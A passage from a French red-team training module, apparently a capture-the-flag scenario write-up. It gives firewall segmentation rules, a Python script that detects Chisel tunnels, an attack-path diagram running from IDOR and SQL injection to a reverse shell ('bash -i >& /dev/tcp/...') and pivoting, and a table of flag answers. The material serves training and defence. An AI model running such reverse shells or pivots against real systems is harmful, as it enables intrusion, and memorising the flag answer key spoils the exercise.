| `-A INPUT -s 10.0.0.0/24 -p tcp --dport 8081 -j DROP` | Bloque tout le trafic entrant sur le port 8081 depuis le réseau interne |
| `-A INPUT -s 10.0.0.100 -p tcp --dport 8081 -j ACCEPT` | Autorise uniquement l'admin (10.0.0.100) à accéder au port 8081 |
| `-A OUTPUT -d 10.0.0.10 -p tcp --dport 8081 -j DROP` | Empêche le serveur web compromis d'initier des connexions vers le serveur interne |
| `-A OUTPUT -d 10.0.0.10 -p tcp --dport 25 -j DROP` | Bloque aussi les connexions SMTP sortantes |
| `-A` | Ajoute une règle à la fin de la chaîne (append) |
| `-s`/`-d` | Source/destination IP (/CIDR) |
| `-j DROP` | Action : rejeter le paquet (peut aussi être `REJECT` avec message d'erreur) |
| Principe de segmentation | **Zoning réseau** : le serveur web (DMZ) ne doit pas pouvoir contacter le serveur interne (zone d'administration) |

```python
# Solution 3 : Détection des tunnels (code applicatif — monitoring des connexions)
import subprocess
import re

def detect_tunnels():
    """Détecte les connexions sortantes inhabituelles sur le serveur."""
    # ss -tpn : affiche les connexions TCP (-t) avec les processus (-p) et numériquement (-n)
    result = subprocess.run(['ss', '-tpn'], capture_output=True, text=True)
    connections = result.stdout

    # Détecter Chisel (proxy SOCKS5 — port par défaut 1080 ou processus nommé chisel)
    if 'socks5' in connections.lower() or '1080' in connections or 'chisel' in connections.lower():
        alert("Tunnel SOCKS5 détecté !")

    # Détecter les connexions sortantes vers des IP du réseau interne non autorisées
    for match in re.finditer(r'10\.0\.0\.\d+:\d+', connections):
        ip_port = match.group()  # ex: "10.0.0.10:8081"
        if not is_authorized(ip_port):
            alert(f"Connexion non autorisée : {ip_port}")
```

**Explication du code de détection :**

| Élément | Rôle/Explication |
|---------|------------------|
| `subprocess.run(['ss', '-tpn'], capture_output=True, text=True)` | Exécute `ss -tpn` pour lister les connexions TCP actives avec leurs processus |
| `ss -tpn` | `-t` : TCP, `-p` : affiche le PID/nom du processus, `-n` : pas de résolution DNS |
| `'socks5' in connections.lower()` | Détecte la présence d'un proxy SOCKS5 actif (Chisel) |
| `'1080' in connections` | Port par défaut de Chisel (SOCKS5) |
| `'chisel' in connections.lower()` | Détection par nom de processus |
| `re.finditer(r'10\.0\.0\.\d+:\d+', connections)` | Cherche toutes les connexions vers le réseau interne 10.0.0.0/24 (pivoting) |
| `is_authorized(ip_port)` | Fonction de validation : vérifie si la connexion est légitime (ex: admin) ou suspecte (attaquant) |
| Principe de détection | Monitoring réseau en temps réel pour identifier les comportements anormaux (connexions vers l'interne, tunnels) |

#### Références

- **Chisel** : [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
- **MITRE ATT&CK** : [T1021](https://attack.mitre.org/techniques/T1021/)
- **MITRE ATT&CK** : [T1572](https://attack.mitre.org/techniques/T1572/)
- **CWE** : [CWE-200](https://cwe.mitre.org/data/definitions/200.html) — Exposure of Sensitive Information to an Unauthorized Actor

---

### 6.6 Diagramme de l'attaque complète

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      PARCOURS D'ATTAQUE COMPLET                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Compte fourni                                                          │
│  user@ecovault.com                                                      │
│  User2026!                                                              │
│       │                                                                 │
│       ▼                                                                 │
│  ┌──────────┐                                                           │
│  │  Flag 1  │ IDOR ──── T1548 ── GET /api/profile/1                    │
│  │  IDOR    │ ──────────────────────────────────────────────────        │
│  └──────────┘          └→ Clé API admin récupérée                       │
│       │                                                                 │
│       ▼                                                                 │
│  ┌──────────┐                                                           │
│  │  Flag 2  │ SQLi ───── T1190 ── GET /api/transactions?filter=        │
│  │  SQLi    │ ──────────────────────────────────────────────────        │
│  └──────────┘          └→ Table users extraite (emails, mots de passe)  │
│       │                                                                 │
│       ▼                                                                 │
│  ┌──────────┐                                                           │
│  │  Flag 3  │ JWT ────── T1078 ── Forge token admin                    │
│  │  JWT     │ ──────────────────────────────────────────────────        │
│  └──────────┘          └→ Accès admin à /admin/templates                │
│       │                                                                 │
│       ▼                                                                 │
│  ┌──────────┐                                                           │
│  │  Flag 4  │ SSTI ───── T1190→T1059.003 ── POST /admin/templates      │
│  │  RCE     │ ──────────────────────────────────────────────────        │
│  └──────────┘          └→ Reverse shell (bash -i >& /dev/tcp/...)       │
│       │                                                                 │
│       ▼                                                                 │
│  ┌──────────┐                                                           │
│  │  Flag 5  │ Pivot ──── T1021 ── Chisel tunnel → 10.0.0.10            │
│  │  Pivot   │ ──────────────────────────────────────────────────        │
│  └──────────┘          └→ Fichier récupéré sur serveur SMTP interne     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 6.7 Tableau récapitulatif des flags

| Flag | Valeur | Points | Temps estimé | Difficulté |
|:----:|--------|:------:|:------------:|:----------:|
| 1 | `flag{idor_admin_key_7e9f2b}` | 20 | 5 min | ⭐ |
| 2 | `flag{sqli_extract_users_b4d92f}` | 25 | 10 min | ⭐⭐ |
| 3 | `flag{jwt_admin_forge_c3a8e1}` | 25 | 10 min | ⭐⭐⭐ |
| 4 | `flag{ssti_rce_shell_f7c3d9}` | 30 | 15 min | ⭐⭐⭐⭐ |
| 5 | `flag{pivoting_internal_smtp_a1b2c3}` | 20 (B) | 15 min | ⭐⭐⭐⭐⭐ |

### 6.8 Liens et ressources

| Ressource | URL |
|-----------|-----|
| MITRE ATT&CK Enterprise Matrix | [https://attack.mitre.org/matrices/enterprise/](https://attack.mitre.org/matrices/enterprise/) |
| ATT&CK Navigator | [https://github.com/mitre-attack/attack-navigator](https://github.com/mitre-attack/attack-navigator) |
| OWASP Top 10 2025 | [https://owasp.org/Top10/](https://owasp.org/Top10/) |
| PortSwigger Web Security Academy | [https://portswigger.net/web-security](https://portswigger.net/web-security) |
| PayloadsAllTheThings | [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) |
| sqlmap | [https://sqlmap.org](https://sqlmap.org) |
| jwt_tool | [https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) |
| Chisel (tunneling) | [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) |
| JWT.io (decodeur) | [https://jwt.io](https://jwt.io) |
| Directive NIS2 (EUR-Lex) | [https://eur-lex.europa.eu/eli/dir/2022/2555](https://eur-lex.europa.eu/eli/dir/2022/2555) |
| ANSSI — Guide d'hygiène | [https://www.ssi.gouv.fr/guide/guide-dhygiene-informatique/](https://www.ssi.gouv.fr/guide/guide-dhygiene-informatique/) |

---

*Fin du Module 5 — Scénario Autonome EcoVault*  
*Formation Red Team — Master 2 Sécurité et Défense des Systèmes d'Information — SDV 2026*  
*Document conforme au référentiel NIS2 — Article 21 — Gestion des risques*
